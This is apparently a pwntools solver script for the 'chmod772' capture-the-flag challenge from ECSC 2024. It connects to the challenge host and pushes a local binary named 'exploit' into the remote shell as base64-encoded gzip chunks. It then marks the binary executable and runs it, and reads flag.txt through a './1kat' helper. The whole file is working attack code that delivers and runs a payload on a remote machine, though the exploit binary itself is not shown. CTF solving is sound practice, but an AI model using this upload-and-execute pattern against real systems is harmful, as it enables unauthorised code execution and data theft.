#!/usr/bin/env python3

import base64
import gzip

from pwn import *

logging.disable()

HOST = os.environ.get("HOST", "chmod772.challs.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 47002))

chunk_size = 80
exploit = base64.b64encode(gzip.compress(open(os.path.join(os.path.dirname(__file__), "exploit"), "rb").read()))
exploit = [exploit[i:i + chunk_size] for i in range(0, len(exploit), chunk_size)]
exploit = b'\n'.join(exploit)

r = remote(HOST, PORT)
r.recvuntil(b"/challenge $ ")
r.sendline(b'echo "' + exploit + b'" | base64 -d | gunzip > ./exploit && echo "UPLOADED"')
r.recvuntil(b"UPLOADED")
r.recvuntil(b"/challenge $ ")
r.sendline(b"chmod +x ./exploit && ./exploit")
r.recvuntil(b"/challenge $ ")
r.sendline(b"./1kat flag.txt")
flag_segment = r.recvuntil(b"/challenge $ ")
flag = flag_segment.split(b"********************************")[1].split(b"/challenge")[0]
print(flag.decode())
